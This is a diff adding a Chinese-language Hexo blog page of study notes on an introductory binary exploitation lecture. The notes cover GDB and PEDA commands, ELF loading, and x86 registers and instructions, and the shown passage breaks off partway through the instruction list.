@@ -1,0 +1,1615 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Tr0y2ooo">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2024/11/20/ngelboy-pwn1/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="有問題可以提醒我修正PWN1 PWN2  tags: Pwn AngelboyAngelBoy_Pwn Video1環境和Labs 簡報  GDBBasic commandgdb -n(最原始的gdb) -q(不要顯示一大串的資訊) [binary]  run binary - 執行程式 disas function - 反組譯某函式 break *address - 在某地址(或函式)下斷點 i">
+<meta property="og:type" content="article">
+<meta property="og:title" content="AngelBoy Pwn1">
+<meta property="og:url" content="http://example.com/2024/11/20/ngelBoy-Pwn1/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="有問題可以提醒我修正PWN1 PWN2  tags: Pwn AngelboyAngelBoy_Pwn Video1環境和Labs 簡報  GDBBasic commandgdb -n(最原始的gdb) -q(不要顯示一大串的資訊) [binary]  run binary - 執行程式 disas function - 反組譯某函式 break *address - 在某地址(或函式)下斷點 i">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.imgur.com/oxl7v4X.png">
+<meta property="og:image" content="https://i.imgur.com/hWUQOpq.png">
+<meta property="og:image" content="https://i.imgur.com/cIfqbus.png">
+<meta property="og:image" content="https://i.imgur.com/ecOOh2K.png">
+<meta property="og:image" content="https://i.imgur.com/R2A8uls.png">
+<meta property="og:image" content="https://i.imgur.com/Uiq53D9.png">
+<meta property="og:image" content="https://i.imgur.com/liI40DT.png">
+<meta property="og:image" content="https://i.imgur.com/WrI1YR4.png">
+<meta property="og:image" content="https://i.imgur.com/511SuBb.png">
+<meta property="og:image" content="https://i.imgur.com/x5JShND.png">
+<meta property="og:image" content="https://i.imgur.com/PwF5qbW.png">
+<meta property="og:image" content="https://i.imgur.com/YynbFDt.png">
+<meta property="og:image" content="https://i.imgur.com/Gxiwma4.png">
+<meta property="og:image" content="https://i.imgur.com/taVK0LS.png">
+<meta property="og:image" content="https://i.imgur.com/j6BolFi.png">
+<meta property="og:image" content="https://i.imgur.com/q8p4U0J.png">
+<meta property="og:image" content="https://i.imgur.com/RggHxpQ.png">
+<meta property="og:image" content="https://i.imgur.com/Az9SJuw.png">
+<meta property="og:image" content="https://i.imgur.com/ovo9EWB.png">
+<meta property="og:image" content="https://i.imgur.com/q6ZAdNO.png">
+<meta property="og:image" content="https://i.imgur.com/ktSFK3l.png">
+<meta property="og:image" content="https://i.imgur.com/iC6N1El.png">
+<meta property="og:image" content="https://i.imgur.com/CwN3ZRM.png">
+<meta property="og:image" content="https://i.imgur.com/wfrte4m.png">
+<meta property="og:image" content="https://i.imgur.com/iWIBuXa.png">
+<meta property="og:image" content="https://i.imgur.com/XfD1XPl.png">
+<meta property="og:image" content="https://i.imgur.com/DLYwppF.png">
+<meta property="og:image" content="https://i.imgur.com/JKL2KEi.png">
+<meta property="og:image" content="https://i.imgur.com/03avyEM.png">
+<meta property="og:image" content="https://i.imgur.com/djCA3xk.png">
+<meta property="og:image" content="https://i.imgur.com/0xzMYY0.png">
+<meta property="og:image" content="https://i.imgur.com/fMzSgDv.png">
+<meta property="og:image" content="https://i.imgur.com/xbLIzcp.png">
+<meta property="og:image" content="https://i.imgur.com/xVYkcHU.png">
+<meta property="og:image" content="https://i.imgur.com/MgseVF4.png">
+<meta property="og:image" content="https://i.imgur.com/3m8rFNw.png">
+<meta property="og:image" content="https://i.imgur.com/OcPxuUy.png">
+<meta property="og:image" content="https://i.imgur.com/FYdG48f.png">
+<meta property="og:image" content="https://i.imgur.com/57lWwO6.png">
+<meta property="og:image" content="https://i.imgur.com/t3QdxZq.png">
+<meta property="og:image" content="https://i.imgur.com/Q5DlL6B.png">
+<meta property="og:image" content="https://i.imgur.com/0zIY7kA.png">
+<meta property="og:image" content="https://i.imgur.com/EMpnBfX.png">
+<meta property="og:image" content="https://i.imgur.com/5js9CxX.png">
+<meta property="og:image" content="https://i.imgur.com/JiEMXPu.png">
+<meta property="article:published_time" content="2024-11-20T01:31:00.000Z">
+<meta property="article:modified_time" content="2024-11-20T01:35:36.593Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.imgur.com/oxl7v4X.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/null" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/null">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/null">
+    <!--- Page Info-->
+    
+    <title>
+        
+            AngelBoy Pwn1 | Tr0y2ooo in the house
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+    
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"example.com","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/rem.jpg","dark":"/images/rem_dark.jpg"},"title":"‎‎‎‏‎‏‎‏","subtitle":{"text":null,"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":true,"type":"fixed","audios":[{"name":"幹你娘","artist":"DJ Jerry","url":"https://ssl-pixnet-tv.pixfs.net/user/leo4/1231657490.m4a","cover":"https://media.discordapp.net/attachments/850438898093785128/1262046151520161835/1720574532076.gif?ex=67340852&is=6732b6d2&hm=a84a4a8bdeae5d7d34f0a8a1ccc339a001a624eb6ff490d5fd18cb35e0a49b84&=","lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.7.3","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"tags":{"path":"/tags/","icon":"fa-solid fa-tags"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/EvanNotFound/hexo-theme-redefine","Blog":"https://ohevan.com"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":{"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3,"Tags":null,"icon":"fa-solid fa-tags","path":"/tags/"}},"footerStart":"2022/8/17 11:45:14"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+<!--        <span class="swup-progress-icon">-->
+<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+<!--        </span>-->
+    
+</div>
+
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container flex flex-col justify-between min-h-dvh">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Tr0y2ooo in the house
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/tags/"
+                                        >
+                                    <i class="fa-solid fa-tags fa-fw"></i>
+                                    TAGS
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    ARCHIVES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown"
+                                   href="#"
+                                        onClick=&#34;return false;&#34;>
+                                    <i class="fa-regular fa-user fa-fw"></i>
+                                    ABOUT
+                                    <i class="fa-solid fa-chevron-down fa-fw"></i>
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                        
+                                            <li>
+                                                <a href="/about">
+                                                    ME
+                                                </a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a target="_blank" rel="noopener" href="https://github.com/EvanNotFound/hexo-theme-redefine">
+                                                    GITHUB
+                                                </a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a target="_blank" rel="noopener" href="https://ohevan.com">
+                                                    BLOG
+                                                </a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/tags/"
+                        >
+                            <span>
+                                TAGS
+                            </span>
+                            
+                                <i class="fa-solid fa-tags fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives"
+                        >
+                            <span>
+                                ARCHIVES
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item-sub text-base my-1.5 flex flex-col w-full">
+                        
+                        <div class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary cursor-pointer text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                             navbar-data-toggle="submenu-About"
+                        >
+                            <span>
+                                ABOUT
+                            </span>
+                            
+                                <i class="fa-solid fa-chevron-right fa-sm fa-fw transition-all"></i>
+                            
+                        </div>
+                        
+
+                        
+                            <div class="flex-col items-start px-2 py-2 hidden" data-target="submenu-About">
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           href="/about">ME</a>
+                                    </div>
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           target="_blank" rel="noopener" href="https://github.com/EvanNotFound/hexo-theme-redefine">GITHUB</a>
+                                    </div>
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           target="_blank" rel="noopener" href="https://ohevan.com">BLOG</a>
+                                    </div>
+                                
+                            </div>
+                        
+                    </li>
+            
+
+            
+            
+                
+                    
+                    
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
+                           href="/tags"
+                        >
+                            <span>Tags</span>
+                            <i class="fa-regular fa-tags fa-sm fa-fw"></i>
+                        </a>
+                    </li>
+                
+                    
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
+                           href="/categories"
+                        >
+                            <span>Categories</span>
+                            <i class="fa-regular fa-folder fa-sm fa-fw"></i>
+                        </a>
+                    </li>
+                
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">6</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">7</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">7</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">AngelBoy Pwn1</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/personal.jpg">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Tr0y2ooo</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv1</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2024-11-20 09:31</span>
+        <span class="mobile">2024-11-20 09:31</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2024-11-20 09:35:36</span>
+            <span class="mobile">2024-11-20 09:35:36</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/ctf/">ctf</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/pwn/">pwn</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <p>有問題可以提醒我修正<br><a class="link"   target="_blank" rel="noopener" href="https://tr0y2ooo.github.io/2024/11/12/AngelBoy-Pwn1/" >PWN1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   target="_blank" rel="noopener" href="https://tr0y2ooo.github.io/2024/11/12/AngelBoy-Pwn2/" >PWN2 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h6 id="tags-Pwn-Angelboy"><a href="#tags-Pwn-Angelboy" class="headerlink" title="tags: Pwn Angelboy"></a>tags: <code>Pwn</code> <code>Angelboy</code></h6><h1 id="AngelBoy-Pwn-Video1"><a href="#AngelBoy-Pwn-Video1" class="headerlink" title="AngelBoy_Pwn Video1"></a>AngelBoy_Pwn Video1</h1><p><a class="link"   target="_blank" rel="noopener" href="https://github.com/scwuaptx/HITCON-Training" >環境和Labs <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   target="_blank" rel="noopener" href="https://www.slideshare.net/AngelBoy1/linux-binary-exploitation-basic-knowledge" >簡報 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h2 id="GDB"><a href="#GDB" class="headerlink" title="GDB"></a>GDB</h2><h3 id="Basic-command"><a href="#Basic-command" class="headerlink" title="Basic command"></a>Basic command</h3><p>gdb -n(最原始的gdb) -q(不要顯示一大串的資訊) [binary]</p>
+<ul>
+<li>run <strong>binary</strong> - 執行程式</li>
+<li>disas <strong>function</strong> - 反組譯某函式</li>
+<li>break *<strong>address</strong> - 在某地址(或函式)下斷點</li>
+<li>info breakpoint - 查看有哪些斷點</li>
+<li>info <strong>register</strong> - 查看所有暫存器的值</li>
+<li>x&#x2F;wx <strong>address</strong> - 查看某地址的內容<br>(w可以替換成b&#x2F;h&#x2F;g —&gt;1&#x2F;2&#x2F;8 byte<br>&#x2F;後面接數字可以列出多個內容<br>第二個x可以替換成u&#x2F;d&#x2F;s&#x2F;i—&gt;unsigned int&#x2F;decimal&#x2F;string&#x2F;instruction)</li>
+<li>ni - 進到下一行instruction(遇到function不會追進去)</li>
+<li>si - 進到下一行instruction(遇到function會追進去)</li>
+<li>backtrace - 顯示上層所有stack frame資訊</li>
+<li>continue - 繼續執行</li>
+<li>set *<strong>address</strong>&#x3D;value - 設定某位址的值<br>(用*一次4byte<br>將*改成{int}&#x2F;{short}&#x2F;{long}—&gt;1&#x2F;2&#x2F;8byte)</li>
+<li>attach <strong>pid</strong> - attach一個正在運行的process</li>
+<li>info function - 看所有函式位址</li>
+<li>lay asm</li>
+</ul>
+<h3 id="PEDA"><a href="#PEDA" class="headerlink" title="PEDA"></a>PEDA</h3><p>python寫的gdb插件</p>
+<blockquote>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/longld/peda" >原版 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   target="_blank" rel="noopener" href="https://github.com/scwuaptx/peda" >Angelboy版 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   target="_blank" rel="noopener" href="https://github.com/scwuaptx/Pwngdb" >Angelboy Extra <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+</blockquote>
+<p>Useful Feature</p>
+<ul>
+<li>checksec - 檢查binary有哪些保護機制</li>
+<li>elfsymbol - 查看function .plt</li>
+<li>vmmap - 查看記憶體分布和rwx權限</li>
+<li>readelf - 查看section位置</li>
+<li>find (alias searchmem) - 搜尋memory中的patten</li>
+<li>record - 回溯之前的指令</li>
+</ul>
+<p>-<a href="#Lab1">Lab1</a></p>
+<h2 id="Execution"><a href="#Execution" class="headerlink" title="Execution"></a>Execution</h2><h3 id="Binary-Format"><a href="#Binary-Format" class="headerlink" title="Binary Format"></a>Binary Format</h3><p>根據OS不同有所不同</p>
+<ul>
+<li>Linux - ELF</li>
+<li>Windows - PE</li>
+<li>Mac - MacBinary<br>開頭會有Magic Number方便OS辨識檔案類型</li>
+</ul>
+<h2 id="Section"><a href="#Section" class="headerlink" title="Section"></a>Section</h2><p>根據讀寫執行權限和特性分類</p>
+<ul>
+<li>system  -  跟系統相關的指令參數</li>
+<li>stack  -  存區域變數以及函數回傳值</li>
+<li>heap  -  存動態配置的變數</li>
+<li>bss  -  存未初始化的全域變數</li>
+<li>data  -  存有初始化值的全域變數</li>
+<li>rodata  -  唯讀的資料</li>
+<li>text  -  放編譯後的code</li>
+</ul>
+<h2 id="Execution-Flow"><a href="#Execution-Flow" class="headerlink" title="Execution Flow"></a>Execution Flow</h2><p>在Linux執行一支Binary的過程<br>static Linked<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i.imgur.com/oxl7v4X.png"
+                     
+                ><br>Dynamic Linked<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i.imgur.com/hWUQOpq.png"
+                     
+                ><br><strong>User Mode：</strong><br>一開始會先呼叫fork()去複製原本的程序(Process)產生一個子程序(child-process)，child-process再去執行execve()<br>接下來就進到</p>
+<p><strong>Kernel Mode：</strong><br>裡面主要會先呼叫sys_execve()<br>去檢查參數的格式是不是正確的。</p>
+<p>例如：argv要是一個指標陣列，你傳字串進去他就會回傳-1然後跳出來，成功通過的話就執行下一個函式。</p>
+<p><strong>do_execve()</strong><br>去搜尋執行檔的位置是否存在這個執行檔，沒有的話就回傳-1，讀取的同時也會順便讀前128byte取得執行檔的格式。</p>
+<p><strong>search_binary_handler()</strong><br>根據前面讀到的檔案格式選擇執行那個程式的function。</p>
+<p>例如：前面讀到他是一個python的script，那就用load_script()去處理。<br>前面讀到是一個elf就用load_elf_binary()去處理。</p>
+<p><strong>load_elf_binary()</strong><br>檢查程式header，如果是Dynamic linking會利用.interp這個section確定loader的路徑，接下來把program header紀錄的位置mapping到memory中，最後把sys_execve()的return address改成loader(ld.so)的entry point;static linking則是改成elf的entry point。</p>
+<p>程式是怎麼maps到虛擬記憶體的?<br>在程式的header中記錄著哪些segment應該mapping到甚麼位置，以及讀寫執行權限，還有哪些section屬於哪些segment。<br>一個segment可能有0個或是多個section。</p>
+<p>一些指令：</p>
+<p>查看program header</p>
+<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -l [binary]</span><br></pre></td></tr></table></figure></div>
+<p>查看section header</p>
+<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -s [binary]</span><br></pre></td></tr></table></figure></div>
+<p>查看dynamic section內容</p>
+<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -d [binary]</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="x86-assembly"><a href="#x86-assembly" class="headerlink" title="x86 assembly"></a>x86 assembly</h2><h3 id="Registers"><a href="#Registers" class="headerlink" title="Registers"></a>Registers</h3><ul>
+<li>General-Purpose Registers<ul>
+<li>EAX EBX ECX EDX - 32bit</li>
+<li>AX BX CX DX - 16bit</li>
+<li>AH BH CH DH - 8bit(high)</li>
+<li>AL BL CL DL - 8bit(low)</li>
+</ul>
+</li>
+<li>Buffer Pointer<ul>
+<li>EDI ESI - 32bit</li>
+<li>DI SI - 16bit</li>
+</ul>
+</li>
+<li>Stack Pointer<ul>
+<li>ESP(指向Stack頂端)</li>
+</ul>
+</li>
+<li>Base Pointer<ul>
+<li>EBP(指向Stack底端)</li>
+</ul>
+</li>
+<li>Program counter register<ul>
+<li>EIP(指向目前程式執行的位置)</li>
+</ul>
+</li>
+<li>Flag register<ul>
+<li>eflags(儲存指令執行結果)<a class="link"   target="_blank" rel="noopener" href="https://www.itread01.com/content/1546550129.html" >more <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+</ul>
+</li>
+<li>Segment registers<ul>
+<li>cs(code segment)</li>
+<li>ss(stack segment)</li>
+<li>ds(data segment)</li>
+<li>es(destinatrion segment)</li>
+<li>fs(src)</li>
+<li>gs(src)<br>  <a class="link"   target="_blank" rel="noopener" href="https://stackoverflow.com/questions/10810203/what-is-the-fs-gs-register-intended-for" >src <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+</ul>
+</li>
+</ul>
+<h3 id="Basic-instruction"><a href="#Basic-instruction" class="headerlink" title="Basic instruction"></a>Basic instruction</h3><p>有AT&amp;T和Intel兩種</p>
+<ul>
+<li><p>AT&amp;T</p>
+<ul>
+<li>mov %eax,%ebx</li>
+</ul>
+</li>
+<li><p>Intel</p>
+<ul>
+<li>mov ebx,eax</li>
+<li>除了前面的”%”符號以外，最大的差異就是AT&amp;T是把前面的值給後面的值，Intel則相反。</li>
+</ul>
+</li>
+<li><p>mov</p>
+<ul>
+<li>mov A,B(move B to A)</li>
+<li>A和B size要相等</li>
+<li>Ex：<ul>
+<li>mov eax,ebx(correct)</li>
+<li>mov eax,bl(wrong)</li>
+<li>mov eax,0xdeadbeef(correct)</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>add&#x2F;sub&#x2F;xor&#x2F;and</p>
+<ul>
+<li>add&#x2F;sub&#x2F;xor&#x2F;and [register],[value]&#x2F;[register]</li>
+<li>add&#x2F;sub&#x2F;xor&#x2F;and A,B</li>
+<li>A和B的size要相等</li>
+<li>Ex：<ul>
+<li>add ebp,0x48</li>
+<li>sub eax,ebx</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>push&#x2F;pop</p>
+<ul>
+<li>push&#x2F;pop [register]</li>
+<li>push - 將register抽出來放到stack頂端</li>
+<li>pop - 從stack頂端取4byte(x86)放到register裡面</li>
+<li>Ex：<ul>
+<li>push eax (相當於 sub esp,4;mov [esp],eax)</li>
+<li>pop ebx (相當於 mov ebx,[esp];add esp,4)</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>lea </p>
+<ul>
+<li>跟mov很像</li>
+<li>mov取在該地址的值</li>
+<li>lea取地址address</li>
+<li>Ex：<ul>
+<li>lea eax,[rbp-4]</li>
+</ul>
+</li>
+</ul>
+</li>
